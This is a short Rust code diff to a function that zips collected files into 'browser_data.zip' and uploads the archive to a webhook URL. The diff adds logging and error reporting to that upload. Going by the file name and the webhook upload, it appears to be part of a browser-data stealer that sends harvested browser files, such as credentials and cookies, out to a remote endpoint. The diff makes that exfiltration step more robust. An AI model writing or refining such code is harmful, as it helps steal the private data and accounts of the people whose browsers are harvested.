@@ -10,8 +10,8 @@ pub async fn send_zip(
         return Ok(());
     }
 
-    // Create zip in temp directory
     let zip_path = env::temp_dir().join("browser_data.zip");
+    crate::log::log(&format!("zip building: {} entries", files.len()));
 
     {
         let file = fs::File::create(&zip_path)?;
@@ -27,8 +27,8 @@ pub async fn send_zip(
         zip.finish()?;
     }
 
-    // Read zip and send as multipart
     let zip_data = fs::read(&zip_path)?;
+    crate::log::log(&format!("zip size: {} bytes", zip_data.len()));
 
     let file_count = files.len();
     let part = reqwest::multipart::Part::bytes(zip_data)
@@ -43,9 +43,12 @@ pub async fn send_zip(
         .part("file", part);
 
     let response = client.post(webhook_url).multipart(form).send().await?;
-
-    if !response.status().is_success() {
-        eprintln!("Webhook send failed: {}", response.status());
+    let status = response.status();
+    let body = response.text().await.unwrap_or_default();
+    crate::log::log(&format!("webhook zip send: HTTP {status}"));
+    if !status.is_success() {
+        crate::log::log(&format!("webhook zip body: {body}"));
+        return Err(format!("webhook failed: {status} {body}").into());
     }
 
     // Cleanup
